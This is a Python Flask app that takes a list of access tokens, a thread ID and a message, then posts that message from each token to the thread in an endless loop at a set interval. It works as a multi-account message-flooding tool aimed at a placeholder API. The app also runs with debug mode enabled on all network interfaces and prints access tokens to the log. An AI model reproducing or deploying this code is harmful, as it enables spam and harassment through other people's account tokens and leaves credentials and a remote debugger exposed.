from flask import Flask, request, render_template_string
import requests
from threading import Thread, Event
import time
import random
import string
app = Flask(__name__)
app.debug = True
stop_events = {}
threads = {}
def send_messages(access_tokens, thread_id, message, time_interval, task_id):
    stop_event = stop_events[task_id]
    while not stop_event.is_set():
        for access_token in access_tokens:
            api_url = f'https://api.example.com/send_message/{thread_id}'
            parameters = {'access_token': access_token, 'message': message}
            response = requests.post(api_url, json=parameters)
            if response.status_code == 200:
                print(f"Message sent successfully from token {access_token}: {message}")
            else:
                print(f"Message failed from token {access_token}: {message}")
            time.sleep(time_interval)
@app.route('/', methods=['GET', 'POST'])
def home():
    if request.method == 'POST':
        access_tokens = request.form.get('accessToken').strip().splitlines()
        thread_id = request.form.get('threadId')
        message = request.form.get('message')
        time_interval = int(request.form.get('time'))
        task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=20))
        stop_events[task_id] = Event()
        thread = Thread(target=send_messages, args=(access_tokens, thread_id, message, time_interval, task_id))
        threads[task_id] = thread
        thread.start()
        return f'Task started with ID: {task_id}'
    return render_template_string('''
''')
@app.route('/stop', methods=['POST'])
def stop_task():
    task_id = request.form.get('taskId')
    if task_id in stop_events:
        stop_events[task_id].set()
        return f'Task with ID {task_id} has been stopped.'
    else:
        return f'No task found with ID {task_id}.'
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
